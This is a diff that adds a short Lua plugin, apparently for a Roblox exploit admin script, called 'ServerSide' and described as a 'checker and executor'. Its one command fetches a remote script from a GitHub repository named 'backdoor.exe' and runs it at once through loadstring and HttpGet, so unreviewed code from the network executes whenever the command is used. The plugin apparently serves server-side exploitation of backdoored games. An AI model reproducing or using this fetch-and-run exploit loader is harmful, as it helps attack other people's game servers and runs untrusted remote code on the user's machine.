@@ -1,0 +1,16 @@
+local Plugin = {
+  ["PluginName"] = "ServerSide",
+    ["PluginDescription"] = "Cool checker and executor",
+    ["Commands"] = {
+        ["ServerSide"] = {
+            ["ListName"] = "ServerSide",
+            ["Description"] = "SS executor",
+            ["Aliases"] = {OH},
+            ["Function"] = function(args,speaker)
+					loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))();
+            end,
+        },
+    },
+}
+
+return Plugin
